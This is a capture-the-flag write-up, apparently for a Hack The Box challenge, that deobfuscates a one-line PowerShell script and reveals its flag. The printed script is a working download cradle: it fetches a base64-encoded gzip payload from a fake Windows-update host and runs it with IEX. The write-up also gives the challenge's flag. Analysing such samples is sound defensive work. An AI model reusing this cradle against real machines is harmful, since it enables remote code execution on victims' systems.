1. After extracting we get one ps1 file (powershell script)
2. The whole script is written on one line, let's go on icyberchef.com and put the recip "**Generic Code Beautify**", we get the following code :

``` powershell
if ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name  - ne 'secret_HQ\Arth'){exit}; # Check the computer name, "protection" to execute only on one computer
$w = New - Object net.webclient; # Create a web client
$w.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials; # Use the system proxy credentials to connect
$d = $w.DownloadString('http://windowsliveupdater.com/updates/33'  +  '96f3bf5a605cc4'  +  '1bd0d6e229148'  +  '2a5/2_34122.gzip.b64'); # download a file with the web client, file in gzip and b64
$s = New - Object IO.MemoryStream(, [Convert]::FromBase64String($d)); # base64 decode the content of the previously downloaded file
$f = 'H'  +  'T'  +  'B'  +  '{p0w3rs'  +  'h3ll'  +  '_Cr4d'  +  'l3s_c4n_g3t'  +  '_th'  +  '3_j0b_d'  +  '0n3}'; # The flag ! :D
IEX (New - Object IO.StreamReader(New - Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd(); # Decompress the gz and read the content of the file
```

3. I add comments to explain each line of code, the variable **$f** contain the flag, we just need to concatenate all the strings and we get : **HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}**
